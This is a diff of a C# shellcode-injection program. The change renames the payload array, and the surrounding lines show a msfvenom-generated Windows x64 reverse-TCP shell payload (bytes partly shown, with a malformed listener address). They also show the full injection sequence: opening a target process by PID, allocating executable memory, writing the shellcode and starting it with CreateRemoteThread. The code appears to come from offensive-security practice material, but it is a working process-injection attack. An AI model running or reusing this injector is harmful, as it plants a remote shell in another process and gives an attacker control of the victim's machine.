@@ -99,7 +99,7 @@ namespace ShellcodeInjection
                 0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00}; ;
 
             // msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.25 LPORT=443 -f csharp
-            byte[] buf = new byte[460] {
+            byte[] metasploit_shellcodex64 = new byte[460] {
                 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                 0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
                 0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
@@ -145,12 +145,12 @@ namespace ShellcodeInjection
 
             IntPtr procHandle = OpenProcess((uint)desiredAccess, false, Convert.ToUInt32(args[0]));
 
-            int shellcode_size = buf.Length;
+            int shellcode_size = metasploit_shellcodex64.Length;
             int bytesWritten = 0;
             int lpthreadIP = 0;
 
             IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
-            WriteProcessMemory(procHandle, init, buf, shellcode_size, ref bytesWritten);
+            WriteProcessMemory(procHandle, init, metasploit_shellcodex64, shellcode_size, ref bytesWritten);
             IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
         }
     }
